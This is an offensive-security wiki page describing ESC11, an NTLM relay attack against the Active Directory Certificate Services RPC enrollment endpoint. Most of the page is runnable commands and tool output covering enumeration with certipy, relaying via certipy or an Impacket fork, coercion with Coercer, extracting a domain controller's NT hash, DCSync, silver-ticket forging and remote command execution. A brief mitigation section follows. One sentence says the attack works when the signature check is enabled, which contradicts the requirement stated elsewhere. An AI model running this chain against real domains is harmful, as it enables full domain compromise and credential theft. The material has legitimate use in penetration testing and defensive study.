# ESC11

## Description <a href="#description" id="description"></a>

ADCS exposes an RPC endpoint for certificate enrollment. The endpoint MS-ICPR is an RPC interface. The RPC protocol allows each interface to define its NTLM signature management policy. In this case, the flag `IF_ENFORCEENCRYPTICERTREQUEST` determines if a signature check is performed. As the RPC protocol supports NTLM authentication, when there are no signature checks performed the endpoint is vulnerable (similar in concept to SMB NTLM relaying when SMB signing is disabled).

Default ADCS settings enforce the signature check. However, in some cases this may be disabled in ADCS in ensure compatability with legacy clients such as Windows Server 2012 and 2008. When this check is enabled, it becomes possible to perform a NTLM relay attack over the RPC endpoint.

### Requirements for attack path <a href="#requirements-for-attack-path" id="requirements-for-attack-path"></a>

* `IF_ENFORCEENCRYPTICERTREQUEST` flag is not enabled on the CA

## Linux

### Enumeration

```python
certipy find -u 'Moe@Security.local' -p 'Password123' -dc-ip 10.10.10.100 -stdout -vulnerable
```

<figure><img src="../../../.gitbook/assets/image (2178).png" alt=""><figcaption></figcaption></figure>

## Performing the attack

There are two ways to perform this attack. Either using certipy or using a fork of Impacket which supports the appropriate RPC calls.

Run certipy, targeting the Certificate Authority and using the required template.

{% hint style="info" %}
Ensure to select the correct template based on the machine account you are attempting to relay authentication to the web enrollement server for:

* DomainControllers --> -template DomainController
* Machine Accounts --> -template Machine
{% endhint %}

```python
certipy relay -target "rpc://10.10.10.2" -ca "SECURITY-CA-CA" -template DomainController 
```

Then force coertion with coercer, selecting the intended target (Domain Controller in the example below)

```python
coercer coerce -l 10.10.10.4 -t 10.10.10.100 -d security.local -u moe -p Password123
```

```
[*] Targeting rpc://10.10.10.2 (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:10.10.10.2[135] to determine ICPR stringbinding
[*] Attacking user 'DC01$@SECURITY'
[*] Requesting certificate for user 'DC01$' with template 'DomainController'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 76
[*] Got certificate with DNS Host Name 'DC01.SECURITY.LOCAL'
[*] Certificate object SID is 'S-1-5-21-13999771-2333344039-1820745628-1000'
[*] Saved certificate and private key to 'dc01.pfx'
```

Alternitavely we can use a fork of impacket which supports the required RPC calls.

```python
# Clone the fork
git clone https://github.com/sploutchy/impacket.git
cd impacket
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# If issues are encountered it could be worth running the setup.py file
sudo python3 setup.py install
```

After setup execute ntlmrelayx.py, targeting the Certificate Authority and selecting the appropriate certificate template.

{% code overflow="wrap" %}
```python
sudo python3 ntlmrelayx.py -t rpc://10.10.10.2 -rpc-mode ICPR -icpr-ca-name 'SECURITY-CA-CA' -smb2support --template DomainController
```
{% endcode %}

Then force coertion with coercer, selecting the intended target (Domain Controller in the example below)

```python
coercer coerce -l 10.10.10.4 -t 10.10.10.100 -d security.local -u moe -p Password123
```

```
[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.10.100, attacking target rpc://10.10.10.2
[*] Authenticating against rpc://10.10.10.2 as SECURITY/DC01$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Connection from 10.10.10.100 controlled, but there are no more targets left!
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] Successfully requested certificate
[*] Request ID is 75
[*] Base64 certificate of user DC01$: 
b'MIIR1QIBAzCCEY8GCSqGSIb3DQEHAaCCEYAEghF8MIIReDCCB68GCSqGSIb3DQEHB<-- Snip -->'
```

{% hint style="info" %}
This Impacket fork does not appear to auto save the pfx file. We need to copy the Base64 encoded certificate data and either decode into a .pfx file or we can use the Base64 encoded data with Rubeus on Windows to generate a RC4 hash or Kerberos TGT.

Ensure when copying the data to only copy between the first ' and last '. As shown in the example above, the output is slightly malformed.
{% endhint %}

Convert the Base64 encoded data to a pfx file

```bash
echo 'MIIR1QIBA <-- Snip --> ECK3ffBogi5wl' | base64 -d > dc01.pfx
```

Regardless of using certipy or ntlmrelayx, we should now have a .pfx file for the system we performed coercion against. We can then use certipy to request credentials.

```python
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.100
```

```
[*] Using principal: dc01$@security.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@security.local': aad3b435b51404eeaad3b435b51404ee:1fe859c38adaa592ad52559fd9ab584d
```

## Post Exploitation

Various post-exploitation steps can be undertaken after obtaining a machine account hash. The below example will focus on post-exploitation with a Domain Controller hash.

### DCSync

A simple approach would be to perform a DCsync with impacket-secretsdump using the domain controller hash obtained from the certificate.

<pre class="language-bash"><code class="lang-bash"><strong># All data
</strong><strong>impacket-secretsdump 'DC01$'@10.10.10.100 -hashes :1fe859c38adaa592ad52559fd9ab584d 
</strong><strong>
</strong><strong># Single user
</strong>impacket-secretsdump 'DC01$'@10.10.10.100 -hashes :1fe859c38adaa592ad52559fd9ab584d -just-dc-user krbtgt
</code></pre>

### Silver Ticket

As an alternative option we can generate a silver ticket for a particular service such as CIFS and then gain direct command execution over the target, in this case the Domain Controller.

Firstly, identify the domain SID.

{% code overflow="wrap" %}
```python
impacket-lookupsid 'DC01$'@10.10.10.100 -hashes :1fe859c38adaa592ad52559fd9ab584d | grep 'Domain SID is:' 
```
{% endcode %}

Next, we use ticketer to forge a silver ticket for a given service. In this case CIFS over Domain Controller.

{% code overflow="wrap" %}
```python
impacket-ticketer -nthash 1fe859c38adaa592ad52559fd9ab584d -domain-sid S-1-5-21-13999771-2333344039-1820745628 -domain security.local -spn cifs/dc01.security.local Administrator 
```
{% endcode %}

Then export the TGS.

```
export KRB5CCNAME=Administrator.ccache
```

Finally, authenticate and issue commands.

```python
nxc smb dc01.security.local --use-kcache -x 'whoami'
```



## Windows

{% hint style="warning" %}
This section is yet to be completed.
{% endhint %}

## Mitigation

To resolve this issue the Certificate Authority needs to have enforced encryption on `MS-ICPR` requests. The following command should be issued on the ADCS server.

```bash
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
```

Then restart the services to allow changes to take place.



```
net stop certsvc & net start certsvc
```
